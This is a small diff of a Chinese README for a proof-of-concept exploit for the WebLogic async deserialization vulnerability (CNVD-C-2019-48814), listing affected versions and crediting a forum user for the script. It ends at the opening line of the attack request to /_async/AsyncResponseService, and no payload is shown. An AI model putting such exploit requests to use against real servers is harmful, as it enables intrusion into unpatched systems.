@@ -1,7 +1,7 @@
 # CNVD-C-2019-48814和CNNVD-201904-961</br>
 感谢t00ls-ximcx0101提供脚本</br>
 CNVD-C-2019-48814 POC Summary</br>
-影响范围:WebLogic 10.*、12.1.3
+影响范围:WebLogic 10.*、12.1.3</br>
 1.Linux
 ```
 POST /_async/AsyncResponseService HTTP/1.1
